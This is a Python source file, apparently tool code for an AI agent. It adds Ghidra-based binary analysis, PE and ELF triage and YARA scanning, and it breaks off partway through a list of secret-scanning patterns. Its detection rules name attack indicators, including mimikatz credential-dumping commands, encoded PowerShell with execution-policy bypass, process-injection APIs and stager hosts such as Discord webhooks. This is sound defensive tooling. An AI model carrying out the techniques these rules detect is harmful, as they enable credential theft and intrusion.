# String-match against the basename of the imported symbol (handles `@@GLIBC`
# version suffixes by splitting on '@').
_GHIDRA_DANGER_IMPORTS = {
    "strcpy", "strcat", "sprintf", "vsprintf", "gets", "scanf",
    "memcpy", "memmove", "strncpy", "strncat",
    "system", "popen", "exec", "execl", "execlp", "execle", "execv", "execvp", "execve",
    "fork", "vfork", "setuid", "setgid", "seteuid", "setegid",
    "dlopen", "dlsym", "LoadLibraryA", "LoadLibraryW", "GetProcAddress",
    "mprotect", "VirtualAlloc", "VirtualProtect", "WriteProcessMemory",
    "ptrace", "syscall",
}


def _resolve_ghidra_install_dir() -> str | None:
    """Find a Ghidra install root. Settings override > $GHIDRA_INSTALL_DIR > common locations."""
    s = get_settings()
    custom = (s.get("ghidra_path") or "").strip()
    if custom and os.path.isdir(custom):
        return custom
    env = os.environ.get("GHIDRA_INSTALL_DIR", "").strip()
    if env and os.path.isdir(env):
        return env
    # Common Windows install patterns. Match anything starting with `ghidra_`.
    pf = Path(os.environ.get("ProgramFiles", r"C:\Program Files"))
    try:
        for child in pf.iterdir():
            if child.is_dir() and child.name.lower().startswith("ghidra_"):
                # sanity-check: the install root contains a `support` dir
                if (child / "support").is_dir():
                    return str(child)
    except OSError:
        pass
    return None


def _ensure_pyghidra_started() -> dict | None:
    """Boot the JVM for pyghidra if not yet running. Returns None on success,
    or an error dict on failure. Idempotent and thread-safe — only the first
    caller pays the ~10s JVM cold start. Subsequent callers return immediately."""
    global _PYGHIDRA_STARTED
    if not _HAVE_PYGHIDRA:
        return {"error": "pyghidra not installed. Run: pip install pyghidra"}
    if _PYGHIDRA_STARTED:
        return None
    with _PYGHIDRA_START_LOCK:
        if _PYGHIDRA_STARTED:
            return None
        install_dir = _resolve_ghidra_install_dir()
        try:
            if install_dir:
                _pyghidra.start(install_dir=install_dir)
            else:
                # Let pyghidra try its own auto-detect (env vars, etc).
                _pyghidra.start()
            _PYGHIDRA_STARTED = True
            return None
        except Exception as e:
            return {
                "error": (
                    f"pyghidra.start() failed: {type(e).__name__}: {e}. "
                    f"Set settings.ghidra_path to your Ghidra install root "
                    f"(e.g. C:\\Program Files\\ghidra_12.0.4_PUBLIC) and ensure "
                    f"JDK 21+ is on PATH."
                )
            }


def tool_ghidra_analyze(args: dict) -> dict:
    """Static analysis of a native binary using Ghidra (in-process via pyghidra).
    Loads the file, runs auto-analysis, and returns format/imports/exports/
    strings/functions plus an optional decompilation of a named function.
    Long-running on first call (~30s for analysis) and on first invocation
    overall (~10s JVM boot). Subsequent calls reuse the running Ghidra."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}

    function_name = (args.get("function") or "").strip()
    decompile = bool(args.get("decompile"))
    max_strings = max(10, min(int(args.get("max_strings") or 200), 2000))
    max_functions = max(10, min(int(args.get("max_functions") or 200), 5000))
    timeout = max(30, min(int(args.get("timeout") or 240), 1800))

    # Approval gate — Ghidra runs auto-analysis which can be heavy on RAM/CPU
    # for huge binaries, plus the JVM persists in memory after first call.
    approval = request_approval(
        title="Analyze with Ghidra",
        command=f'ghidra_analyze "{Path(path).name}"' + (
            f" decompile {function_name}" if (function_name and decompile) else ""
        ),
        details={
            "kind": "ghidra_analyze",
            "source": path,
            "function": function_name,
            "decompile": decompile,
            "timeout_s": timeout,
        },
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied ghidra analysis ({approval.get('status')})"}

    boot_err = _ensure_pyghidra_started()
    if boot_err:
        return boot_err

    t0 = time.time()
    try:
        # Heavy lifting goes inside a worker so we can enforce a hard timeout.
        # Auto-analysis + decompilation can hang on pathological binaries; the
        # alternative (just calling synchronously) would block the bridge.
        result_box: dict[str, object] = {}
        exc_box: dict[str, object] = {}

        def _worker():
            try:
                with _pyghidra.open_program(path, analyze=True) as flat_api:  # type: ignore[attr-defined]
                    program = flat_api.getCurrentProgram()
                    result_box["data"] = _ghidra_collect(
                        program, function_name, decompile,
                        max_strings, max_functions,
                    )
            except Exception as e:  # pragma: no cover (Java exceptions cross JPype)
                exc_box["err"] = f"{type(e).__name__}: {e}"

        worker = threading.Thread(target=_worker, name="ghidra-worker", daemon=True)
        worker.start()
        worker.join(timeout)
        if worker.is_alive():
            return {
                "error": (
                    f"ghidra analysis timed out after {timeout}s. Try a larger "
                    f"timeout, or skip decompile=true and run a smaller follow-up."
                ),
            }
        if "err" in exc_box:
            return {"error": f"ghidra analysis failed: {exc_box['err']}"}
        out = result_box.get("data") or {}
        if not isinstance(out, dict):
            return {"error": "ghidra analysis returned unexpected payload"}
        out["elapsed_s"] = round(time.time() - t0, 2)
        out["source"] = path
        return out
    except Exception as e:
        return {"error": f"ghidra analysis crashed: {type(e).__name__}: {e}"}


def _ghidra_collect(
    program,
    function_name: str,
    decompile: bool,
    max_strings: int,
    max_functions: int,
) -> dict:
    """Walk a loaded Ghidra Program and extract a JSON-friendly summary.
    Kept separate from tool_ghidra_analyze so the worker thread is small and
    the timeout/error handling stays clean."""
    # Format / language metadata
    addr_space = program.getAddressFactory().getDefaultAddressSpace()
    fmt_info = {
        "format": str(program.getExecutableFormat()),
        "language": str(program.getLanguageID()),
        "compiler": str(program.getCompilerSpec().getCompilerSpecID()),
        "address_size_bits": int(addr_space.getSize()),
        "image_base": str(program.getImageBase()),
        "memory_size": int(program.getMemory().getSize()),
        "executable_md5": str(program.getExecutableMD5() or ""),
        "executable_sha256": str(program.getExecutableSHA256() or ""),
    }

    # Imports (external symbols) and exports (entry points)
    sym_tab = program.getSymbolTable()
    imports: list[str] = []
    seen_imports: set[str] = set()
    try:
        for sym in sym_tab.getExternalSymbols():
            n = str(sym.getName())
            if n and n not in seen_imports:
                seen_imports.add(n)
                imports.append(n)
            if len(imports) >= 1000:
                break
    except Exception:
        pass
    imports.sort()

    exports: list[dict] = []
    try:
        for sym in sym_tab.getSymbolIterator():
            try:
                if sym.isExternalEntryPoint():
                    exports.append({
                        "name": str(sym.getName()),
                        "addr": str(sym.getAddress()),
                    })
                    if len(exports) >= 500:
                        break
            except Exception:
                continue
    except Exception:
        pass

    # Functions — enumerate with a hard cap
    fm = program.getFunctionManager()
    functions: list[dict] = []
    target_func = None
    try:
        for f in fm.getFunctions(True):
            entry = {
                "name": str(f.getName()),
                "addr": str(f.getEntryPoint()),
                "size": int(f.getBody().getNumAddresses()),
                "external": bool(f.isExternal()),
            }
            functions.append(entry)
            if function_name and target_func is None and entry["name"] == function_name:
                target_func = f
            if len(functions) >= max_functions and (target_func or not function_name):
                break
    except Exception:
        pass
    function_total = int(fm.getFunctionCount())

    # Defined strings
    strings: list[dict] = []
    try:
        listing = program.getListing()
        for d in listing.getDefinedData(True):
            try:
                if d.hasStringValue():
                    s_val = d.getValue()
                    if s_val is None:
                        continue
                    s_str = str(s_val)
                    if len(s_str) >= 4:
                        strings.append({"addr": str(d.getAddress()), "s": s_str[:240]})
                        if len(strings) >= max_strings:
                            break
            except Exception:
                continue
    except Exception:
        pass

    # Optional decompilation
    decompiled = None
    if function_name and decompile:
        if target_func is None:
            # Fall back to a slower scan in case the early loop bailed before
            # we found the named function.
            try:
                for f in fm.getFunctions(True):
                    if str(f.getName()) == function_name:
                        target_func = f
                        break
            except Exception:
                pass
        if target_func is None:
            decompiled = f"(function not found: {function_name})"
        else:
            try:
                from ghidra.app.decompiler import DecompInterface  # type: ignore
                from ghidra.util.task import ConsoleTaskMonitor    # type: ignore
                dec = DecompInterface()
                try:
                    dec.openProgram(program)
                    res = dec.decompileFunction(target_func, 60, ConsoleTaskMonitor())
                    if res.decompileCompleted():
                        decompiled = str(res.getDecompiledFunction().getC())
                    else:
                        decompiled = f"(decompile failed: {res.getErrorMessage()})"
                finally:
                    dec.dispose()
            except Exception as e:
                decompiled = f"(decompile crashed: {type(e).__name__}: {e})"

    # Risk surface — flag dangerous imports
    risk: list[dict] = []
    for imp in imports:
        # GLIBC versioning: "memcpy@@GLIBC_2.14" → "memcpy"
        base = imp.split("@", 1)[0]
        if base in _GHIDRA_DANGER_IMPORTS:
            risk.append({"kind": "dangerous_import", "name": imp, "base": base})

    return {
        "ok": True,
        **fmt_info,
        "function_count": function_total,
        "function_sample": functions[:max_functions],
        "import_count": len(imports),
        "imports": imports[:300],
        "export_count": len(exports),
        "exports": exports[:200],
        "string_count": len(strings),
        "strings": strings,
        "decompiled": decompiled,
        "risk_summary": risk,
    }


# ---- Binary triage (PE/ELF/Mach-O) + YARA scanning -----------------------
# Lightweight pure-Python triage. binary_inspect runs in tens of milliseconds
# on a typical 5 MB exe, vs Ghidra's ~30s analysis. The model uses this to
# decide whether a binary is interesting enough to escalate to ghidra_analyze.
# yara_scan ships with a small bundled rule set — most users don't have rules
# of their own and the defaults flag the common malware tells we see in
# router firmware, .so libs, and pirated installers.


def _shannon_entropy(data: bytes) -> float:
    """Standard Shannon entropy in bits/byte (0-8). High entropy (>7.0) on
    a PE section is a strong hint that it's packed or encrypted."""
    if not data:
        return 0.0
    from collections import Counter
    import math
    counts = Counter(data)
    total = len(data)
    ent = 0.0
    for c in counts.values():
        p = c / total
        ent -= p * math.log2(p)
    return round(ent, 3)


def _detect_format(head: bytes) -> str:
    """Magic-byte sniff. Returns one of: PE, ELF, MACHO, MACHO_FAT, UNKNOWN."""
    if len(head) < 4:
        return "UNKNOWN"
    if head[:2] == b"MZ":
        return "PE"
    if head[:4] == b"\x7fELF":
        return "ELF"
    # Mach-O 32/64 little + big endian, plus FAT (universal).
    macho = {
        b"\xfe\xed\xfa\xce", b"\xce\xfa\xed\xfe",
        b"\xfe\xed\xfa\xcf", b"\xcf\xfa\xed\xfe",
    }
    if head[:4] in macho:
        return "MACHO"
    if head[:4] in (b"\xca\xfe\xba\xbe", b"\xbe\xba\xfe\xca"):
        # Note: Java .class also uses CAFEBABE — but at offset 0 with magic,
        # it's followed by a u2 minor version; Mach-O FAT has nfat_arch. We
        # don't disambiguate further here; the caller will fall through to
        # unknown format if neither pefile nor pyelftools accepts the file.
        return "MACHO_FAT"
    return "UNKNOWN"


# PE machine type → architecture name. Limited to the values pefile actually
# emits. Anything missing falls through to a hex string so the user still gets
# a useful answer instead of "unknown".
_PE_MACHINE = {
    0x014c: "i386",
    0x0200: "ia64",
    0x8664: "x86_64",
    0x01c0: "ARM",
    0x01c4: "ARMv7-Thumb",
    0xaa64: "ARM64",
    0x0ebc: "EFI byte code",
    0x0162: "MIPS R3000",
    0x0166: "MIPS R4000",
    0x01f0: "PowerPC",
    0x01f1: "PowerPC FP",
    0x0266: "MIPS16",
    0x0366: "MIPS-FPU",
    0x0466: "MIPS16-FPU",
    0x5032: "RISCV32",
    0x5064: "RISCV64",
}

# Section-name fingerprints for popular packers. Match prefix because most
# packers append numbers/hex (".upx0", ".upx1", ".vmp0", ".themida0", ...).
_PACKER_SECTION_HINTS = (
    (".upx", "UPX"),
    ("upx", "UPX"),
    (".vmp", "VMProtect"),
    (".themida", "Themida"),
    (".enigma", "Enigma Protector"),
    (".aspack", "ASPack"),
    (".adata", "ASPack"),
    (".pec", "PECompact"),
    (".petite", "Petite"),
    (".mpress", "MPRESS"),
    (".nsp", "NsPack"),
    (".y0da", "yoda"),
    (".taz", "PESpin"),
)


def _inspect_pe(path: str) -> dict:
    """pefile-based triage. Architecture, sections (with entropy + R/W/X),
    imports per DLL, exports, Authenticode signature presence, imphash, and a
    packer hint based on section names."""
    if not _HAVE_PEFILE:
        return {"error": "pefile not installed. Run: pip install pefile"}
    try:
        pe = _pefile.PE(path, fast_load=False)
    except Exception as e:
        return {"error": f"pefile parse failed: {type(e).__name__}: {e}"}

    fh = pe.FILE_HEADER
    machine = getattr(fh, "Machine", 0)
    arch = _PE_MACHINE.get(machine, f"0x{machine:04x}")
    is_dll = bool(getattr(fh, "Characteristics", 0) & 0x2000)

    ts = int(getattr(fh, "TimeDateStamp", 0) or 0)
    try:
        from datetime import datetime, timezone
        ts_iso = datetime.fromtimestamp(ts, tz=timezone.utc).isoformat() if ts else None
    except Exception:
        ts_iso = None

    sections = []
    packers = set()
    for s in pe.sections:
        try:
            name = s.Name.rstrip(b"\x00").decode("utf-8", "replace")
        except Exception:
            name = repr(s.Name)
        ch = int(getattr(s, "Characteristics", 0) or 0)
        flags = ""
        flags += "R" if ch & 0x40000000 else "-"
        flags += "W" if ch & 0x80000000 else "-"
        flags += "X" if ch & 0x20000000 else "-"
        try:
            ent = round(float(s.get_entropy()), 3)
        except Exception:
            ent = 0.0
        sections.append({
            "name": name,
            "vsize": int(getattr(s, "Misc_VirtualSize", 0) or 0),
            "rsize": int(getattr(s, "SizeOfRawData", 0) or 0),
            "vaddr": f"0x{int(getattr(s, 'VirtualAddress', 0) or 0):08x}",
            "flags": flags,
            "entropy": ent,
        })
        low = name.lower()
        for pfx, label in _PACKER_SECTION_HINTS:
            if low.startswith(pfx):
                packers.add(label)
                break

    imports: dict[str, list[str]] = {}
    danger_hits: list[str] = []
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            try:
                dll = entry.dll.decode("utf-8", "replace")
            except Exception:
                dll = repr(entry.dll)
            sym_list: list[str] = []
            for imp in entry.imports:
                if not imp.name:
                    if imp.ordinal is not None:
                        sym_list.append(f"#{imp.ordinal}")
                    continue
                try:
                    sym = imp.name.decode("utf-8", "replace")
                except Exception:
                    sym = repr(imp.name)
                sym_list.append(sym)
                base = sym.split("@", 1)[0]
                if base in _GHIDRA_DANGER_IMPORTS:
                    danger_hits.append(f"{dll}:{sym}")
            imports[dll] = sym_list

    exports: list[str] = []
    if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if sym.name:
                try:
                    exports.append(sym.name.decode("utf-8", "replace"))
                except Exception:
                    exports.append(repr(sym.name))
            elif sym.ordinal is not None:
                exports.append(f"#{sym.ordinal}")

    # Authenticode signature lives in DATA_DIRECTORY[4] (IMAGE_DIRECTORY_ENTRY_SECURITY).
    sig_size = 0
    sig_present = False
    try:
        sec_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
        sig_size = int(getattr(sec_dir, "Size", 0) or 0)
        sig_present = sig_size > 0
    except Exception:
        pass

    try:
        imphash = pe.get_imphash() or ""
    except Exception:
        imphash = ""

    out = {
        "format": "PE32+" if machine == 0x8664 else "PE32",
        "arch": arch,
        "is_dll": is_dll,
        "compile_timestamp": ts,
        "compile_time_iso": ts_iso,
        "section_count": len(sections),
        "sections": sections,
        "import_dll_count": len(imports),
        "import_total": sum(len(v) for v in imports.values()),
        "imports": {k: v[:200] for k, v in list(imports.items())[:50]},
        "export_count": len(exports),
        "exports": exports[:200],
        "signed": sig_present,
        "signature_size": sig_size,
        "imphash": imphash,
        "packer_hints": sorted(packers),
        "dangerous_imports": sorted(set(danger_hits))[:50],
    }
    try:
        pe.close()
    except Exception:
        pass
    return out


_ELF_MACHINE = {
    0x03: "i386", 0x3E: "x86_64", 0x28: "ARM", 0xB7: "AArch64",
    0x08: "MIPS", 0x14: "PowerPC", 0x15: "PowerPC64",
    0xF3: "RISC-V", 0x16: "S390", 0x32: "IA-64",
}


def _inspect_elf(path: str) -> dict:
    """pyelftools-based triage. Falls back to a minimal stdlib header parse if
    pyelftools isn't installed, so the user still gets *something* useful."""
    if _HAVE_PYELFTOOLS:
        try:
            with open(path, "rb") as f:
                ef = _ELFFile(f)
                hdr = ef.header
                ei_class = int(hdr["e_ident"]["EI_CLASS"])  # 1=32, 2=64
                ei_data = str(hdr["e_ident"]["EI_DATA"])
                emach = int(hdr["e_machine"]) if isinstance(hdr["e_machine"], int) else 0
                arch = _ELF_MACHINE.get(emach, str(hdr["e_machine"]))
                etype = str(hdr["e_type"])

                sections = []
                for s in ef.iter_sections():
                    try:
                        flags = int(s["sh_flags"])
                    except Exception:
                        flags = 0
                    sf = ""
                    sf += "A" if flags & 0x2 else "-"
                    sf += "W" if flags & 0x1 else "-"
                    sf += "X" if flags & 0x4 else "-"
                    sections.append({
                        "name": s.name,
                        "size": int(s["sh_size"]),
                        "addr": f"0x{int(s['sh_addr']):08x}",
                        "flags": sf,
                    })

                needed: list[str] = []
                imports: list[str] = []
                danger_hits: list[str] = []
                dyn = ef.get_section_by_name(".dynamic")
                if dyn is not None:
                    try:
                        for tag in dyn.iter_tags():
                            if getattr(tag, "entry", None) and tag.entry.d_tag == "DT_NEEDED":
                                needed.append(tag.needed)
                    except Exception:
                        pass
                dynsym = ef.get_section_by_name(".dynsym")
                if dynsym is not None:
                    try:
                        for sym in dynsym.iter_symbols():
                            if not sym.name:
                                continue
                            # imports are SHN_UNDEF entries (referenced, not defined).
                            try:
                                if sym["st_shndx"] == "SHN_UNDEF":
                                    imports.append(sym.name)
                                    base = sym.name.split("@", 1)[0]
                                    if base in _GHIDRA_DANGER_IMPORTS:
                                        danger_hits.append(sym.name)
                            except Exception:
                                continue
                    except Exception:
                        pass

                return {
                    "format": "ELF64" if ei_class == 2 else "ELF32",
                    "arch": arch,
                    "endian": "little" if "LSB" in ei_data else "big",
                    "type": etype,
                    "section_count": len(sections),
                    "sections": sections[:80],
                    "needed": needed[:80],
                    "import_count": len(imports),
                    "imports": imports[:300],
                    "dangerous_imports": sorted(set(danger_hits))[:50],
                }
        except Exception as e:
            return {"error": f"pyelftools parse failed: {type(e).__name__}: {e}"}

    # Fallback: parse just the ELF header by hand. No imports/sections, but at
    # least format/arch are useful.
    try:
        import struct
        with open(path, "rb") as f:
            ident = f.read(16)
            rest = f.read(20)
        if ident[:4] != b"\x7fELF":
            return {"error": "not an ELF file"}
        ei_class = ident[4]
        ei_data = ident[5]
        endian = "<" if ei_data == 1 else ">"
        e_type, e_machine = struct.unpack(endian + "HH", rest[:4])
        return {
            "format": "ELF64" if ei_class == 2 else "ELF32",
            "arch": _ELF_MACHINE.get(e_machine, f"0x{e_machine:04x}"),
            "endian": "little" if ei_data == 1 else "big",
            "type": f"0x{e_type:04x}",
            "note": "pyelftools not installed; install with: pip install pyelftools",
        }
    except Exception as e:
        return {"error": f"ELF header parse failed: {type(e).__name__}: {e}"}


def tool_binary_inspect(args: dict) -> dict:
    """Fast triage for native binaries. Returns format/arch/sections/imports/
    exports/entropy + packer + signing hints. Use this BEFORE ghidra_analyze
    to decide whether a deeper look is worth ~30s of analysis time."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}

    try:
        size = os.path.getsize(path)
    except OSError as e:
        return {"error": f"stat failed: {e}"}

    # Cap on the bytes used for whole-file entropy + magic detection. Header
    # sniff only needs the first 4; entropy is best run against the entire
    # file but on huge installers we'd rather sample. 16 MiB is plenty.
    SAMPLE_CAP = 16 * 1024 * 1024
    try:
        with open(path, "rb") as f:
            head = f.read(4)
            f.seek(0)
            if size <= SAMPLE_CAP:
                whole = f.read()
            else:
                # Sample head + middle + tail so packed-section gradients don't
                # average out to a flat number.
                third = SAMPLE_CAP // 3
                a = f.read(third)
                f.seek(size // 2)
                b = f.read(third)
                f.seek(max(0, size - third))
                c = f.read(third)
                whole = a + b + c
    except OSError as e:
        return {"error": f"read failed: {e}"}

    fmt = _detect_format(head)
    file_ent = _shannon_entropy(whole)

    import hashlib
    md5 = hashlib.md5(whole).hexdigest() if size <= SAMPLE_CAP else None
    sha1 = hashlib.sha1(whole).hexdigest() if size <= SAMPLE_CAP else None
    sha256 = hashlib.sha256(whole).hexdigest() if size <= SAMPLE_CAP else None

    base: dict = {
        "path": path,
        "size": size,
        "format": fmt,
        "file_entropy": file_ent,
        "md5": md5,
        "sha1": sha1,
        "sha256": sha256,
        "sampled": size > SAMPLE_CAP,
    }

    if fmt == "PE":
        base["details"] = _inspect_pe(path)
    elif fmt == "ELF":
        base["details"] = _inspect_elf(path)
    elif fmt in ("MACHO", "MACHO_FAT"):
        base["details"] = {
            "note": "Mach-O detailed parsing not implemented yet; format detected via magic bytes.",
        }
    else:
        base["details"] = {"note": "unrecognized format (no MZ/ELF/Mach-O magic)."}

    # Risk summary the model can render directly.
    risks: list[str] = []
    det = base.get("details") or {}
    if isinstance(det, dict):
        if det.get("dangerous_imports"):
            risks.append(f"dangerous imports: {', '.join(det['dangerous_imports'][:8])}")
        if det.get("packer_hints"):
            risks.append(f"packer hint: {', '.join(det['packer_hints'])}")
        if fmt == "PE" and det.get("signed") is False:
            risks.append("unsigned PE")
        for s in (det.get("sections") or [])[:20]:
            if isinstance(s, dict) and s.get("entropy", 0) >= 7.0 and s.get("name"):
                risks.append(f"high-entropy section {s['name']} ({s['entropy']})")
    if file_ent >= 7.5:
        risks.append(f"whole-file entropy {file_ent} (likely packed/encrypted)")
    base["risk_summary"] = risks
    return base


# --- YARA -----------------------------------------------------------------
# A small bundled rule set. Keep these intentionally narrow — false positives
# train models to ignore the tool. Each rule uses `condition: <N> of them`
# with N small enough to fire on real samples but big enough that a benign
# binary with one match doesn't trigger.
_DEFAULT_YARA_RULES = r"""
rule SuspiciousURL
{
    meta:
        description = "URL referencing pastebin/discord/tempfile hosts often used by stagers"
        author = "accuretta"
    strings:
        $u1 = "pastebin.com/raw/" nocase ascii wide
        $u2 = "hastebin.com/raw/" nocase ascii wide
        $u3 = "ghostbin.com/paste/" nocase ascii wide
        $u4 = "discordapp.com/api/webhooks/" nocase ascii wide
        $u5 = "transfer.sh/" nocase ascii wide
        $u6 = "anonfile.com/" nocase ascii wide
        $u7 = "ngrok.io/" nocase ascii wide
        $u8 = "duckdns.org" nocase ascii wide
        $u9 = "bit.ly/" nocase ascii wide
    condition:
        any of them
}

rule HardcodedIPv4
{
    meta:
        description = "Possible hardcoded IPv4 (loose; many false positives in version strings)"
    strings:
        $ip = /[^0-9.]([1-9][0-9]{0,2}\.){3}[1-9][0-9]{0,2}[^0-9.]/ ascii wide
    condition:
        #ip > 3
}

rule WindowsRegistryAutorun
{
    meta:
        description = "Strings referencing Windows Run/RunOnce autorun keys"
    strings:
        $r1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase ascii wide
        $r2 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" nocase ascii wide
        $r3 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" nocase ascii wide
        $r4 = "Software\\Microsoft\\Active Setup\\Installed Components" nocase ascii wide
    condition:
        any of them
}

rule SuspiciousAPIs
{
    meta:
        description = "Combination of process-injection / persistence APIs"
    strings:
        $a1 = "VirtualAllocEx" ascii wide
        $a2 = "WriteProcessMemory" ascii wide
        $a3 = "CreateRemoteThread" ascii wide
        $a4 = "NtUnmapViewOfSection" ascii wide
        $a5 = "SetWindowsHookExA" ascii wide
        $a6 = "SetWindowsHookExW" ascii wide
        $a7 = "QueueUserAPC" ascii wide
        $a8 = "RtlCreateUserThread" ascii wide
    condition:
        3 of them
}

rule PowerShellEncoded
{
    meta:
        description = "powershell -enc / -encodedcommand invocation"
    strings:
        $p1 = "powershell" nocase ascii wide
        $p2 = " -enc " nocase ascii wide
        $p3 = " -encodedcommand" nocase ascii wide
        $p4 = "-NoProfile -ExecutionPolicy Bypass" nocase ascii wide
    condition:
        $p1 and any of ($p2, $p3, $p4)
}

rule Base64ExecutableHeader
{
    meta:
        description = "Base64-encoded PE (MZ) header — common dropper pattern"
    strings:
        // 'MZ' followed by the standard PE preamble (\x90\x00\x03), b64-encoded
        $b1 = "TVqQAAMAAAAEAAAA" ascii wide
        $b2 = "TVoAAAAAAAAAAAAA" ascii wide
        // 'MZ\x00\x00' / common DOS stub variants
        $b3 = "TVoAAAAA" ascii wide
    condition:
        any of them
}

rule MimikatzStrings
{
    meta:
        description = "Strings characteristic of mimikatz"
    strings:
        $m1 = "sekurlsa::logonpasswords" nocase ascii wide
        $m2 = "kerberos::list" nocase ascii wide
        $m3 = "lsadump::sam" nocase ascii wide
        $m4 = "mimikatz" nocase ascii wide
        $m5 = "gentilkiwi" nocase ascii wide
    condition:
        2 of them
}
"""


def _yara_compile(rules_arg: str) -> tuple[Any, dict | None]:
    """Compile YARA rules from one of: (a) absolute path to a .yar/.yara file,
    (b) inline source string, or (c) empty/missing -> bundled defaults.
    Returns (rules_object, error_or_None)."""
    if not _HAVE_YARA:
        return None, {"error": "yara-python not installed. Run: pip install yara-python"}
    src = (rules_arg or "").strip()
    try:
        if src and os.path.isfile(src):
            return _yara.compile(filepath=src), None
        if src:
            return _yara.compile(source=src), None
        return _yara.compile(source=_DEFAULT_YARA_RULES), None
    except Exception as e:
        return None, {"error": f"yara compile failed: {type(e).__name__}: {e}"}


def _yara_string_to_dict(item) -> dict:
    """Adapt to both new (yara-python >=4.3 StringMatch object) and old (tuple)
    match string formats so the tool keeps working across versions."""
    # New API: StringMatch(identifier, instances=[StringMatchInstance(offset, matched_data, ...)])
    try:
        ident = getattr(item, "identifier", None)
        if ident is not None:
            instances = []
            for inst in getattr(item, "instances", []) or []:
                try:
                    matched = getattr(inst, "matched_data", b"") or b""
                    if isinstance(matched, bytes):
                        try:
                            mtxt = matched.decode("utf-8", "replace")
                        except Exception:
                            mtxt = matched.hex()
                    else:
                        mtxt = str(matched)
                    instances.append({
                        "offset": int(getattr(inst, "offset", 0) or 0),
                        "match": mtxt[:200],
                    })
                except Exception:
                    continue
            return {"identifier": ident, "instances": instances[:10]}
    except Exception:
        pass
    # Old tuple API: (offset, identifier, matched_bytes)
    try:
        off, ident, matched = item
        if isinstance(matched, bytes):
            try:
                mtxt = matched.decode("utf-8", "replace")
            except Exception:
                mtxt = matched.hex()
        else:
            mtxt = str(matched)
        return {"identifier": ident, "instances": [{"offset": int(off), "match": mtxt[:200]}]}
    except Exception:
        return {"identifier": str(item), "instances": []}


def tool_yara_scan(args: dict) -> dict:
    """Scan a file or directory with YARA. By default uses a bundled rule set;
    pass rules='C:\\path\\to\\my.yar' to point at a custom file or rules='rule X
    {...}' to compile inline source. Returns matches grouped per file."""
    if not _HAVE_YARA:
        return {"error": "yara-python not installed. Run: pip install yara-python"}

    target_arg = args.get("path") or ""
    if not target_arg:
        return {"error": "missing path"}

    path, err = _fw_check_path(target_arg)
    if err:
        return err

    rules_arg = (args.get("rules") or "").strip()
    # If `rules` looks like a filesystem path inside the workspace, sandbox it.
    if rules_arg and ("\\" in rules_arg or "/" in rules_arg or rules_arg.lower().endswith((".yar", ".yara"))):
        rp, rerr = _fw_check_path(rules_arg, must_exist=True)
        if rerr:
            return rerr
        rules_arg = rp

    rules, cerr = _yara_compile(rules_arg)
    if cerr:
        return cerr

    recursive = bool(args.get("recursive", False))
    max_files = int(args.get("max_files") or 200)
    if max_files < 1:
        max_files = 1
    if max_files > 5000:
        max_files = 5000
    timeout = int(args.get("timeout") or 60)
    if timeout < 1:
        timeout = 1
    if timeout > 600:
        timeout = 600
    max_size = int(args.get("max_size") or 200 * 1024 * 1024)  # 200 MiB
    if max_size < 1024:
        max_size = 1024

    targets: list[str] = []
    if os.path.isfile(path):
        targets.append(path)
    elif os.path.isdir(path):
        if recursive:
            for root, _dirs, files in os.walk(path):
                for n in files:
                    targets.append(os.path.join(root, n))
                    if len(targets) >= max_files:
                        break
                if len(targets) >= max_files:
                    break
        else:
            try:
                for n in os.listdir(path):
                    fp = os.path.join(path, n)
                    if os.path.isfile(fp):
                        targets.append(fp)
                    if len(targets) >= max_files:
                        break
            except OSError as e:
                return {"error": f"listdir failed: {e}"}
    else:
        return {"error": f"not a file or directory: {path}"}

    results: list[dict] = []
    rules_fired: set[str] = set()
    files_with_hits = 0
    skipped = 0
    for fp in targets:
        try:
            sz = os.path.getsize(fp)
        except OSError:
            skipped += 1
            continue
        if sz > max_size:
            skipped += 1
            continue
        try:
            matches = rules.match(fp, timeout=timeout)
        except Exception as e:
            results.append({"path": fp, "error": f"{type(e).__name__}: {e}"})
            continue
        if not matches:
            continue
        files_with_hits += 1
        ms_out = []
        for m in matches:
            try:
                tags = list(getattr(m, "tags", []) or [])
                meta = dict(getattr(m, "meta", {}) or {})
                ns = getattr(m, "namespace", "")
                strings = []
                for s in getattr(m, "strings", []) or []:
                    strings.append(_yara_string_to_dict(s))
                rules_fired.add(m.rule)
                ms_out.append({
                    "rule": m.rule,
                    "namespace": ns,
                    "tags": tags,
                    "meta": meta,
                    "strings": strings[:20],
                })
            except Exception:
                continue
        results.append({"path": fp, "matches": ms_out})

    return {
        "target": path,
        "rules_source": (
            "custom_file" if (rules_arg and os.path.isfile(rules_arg))
            else ("inline" if rules_arg else "bundled_defaults")
        ),
        "files_scanned": len(targets) - skipped,
        "files_skipped": skipped,
        "files_with_matches": files_with_hits,
        "rules_fired": sorted(rules_fired),
        "matches": results,
    }


# --- Tool 1: scan_secrets ---
_REPO_SECRET_RE: list[tuple[str, "re.Pattern[bytes]", int]] = [
    # .env file assignments
    ("dotenv_secret",            re.compile(rb"(?i)^\s*(?:DB_PASSWORD|SECRET_KEY|API_SECRET|AWS_SECRET|PRIVATE_KEY|DATABASE_URL|REDIS_URL|MONGO_URI|SMTP_PASSWORD|AUTH_TOKEN)\s*=\s*[^\s#]{8,}", re.MULTILINE), 15),
    # Azure tokens
    ("azure_client_secret",      re.compile(rb"(?i)azure[^\n]{0,30}(?:client.?secret|tenant.?id)[^a-z0-9]{0,5}[A-Za-z0-9_\-\.~]{20,}"), 30),
    # npm tokens
    ("npm_token",                re.compile(rb"//registry\.npmjs\.org/:_authToken=[A-Za-z0-9\-_]{36,}"), 50),
    # PyPI tokens
    ("pypi_token",               re.compile(rb"\bpypi-[A-Za-z0-9_\-]{60,}\b"), 64),
    # Heroku API key
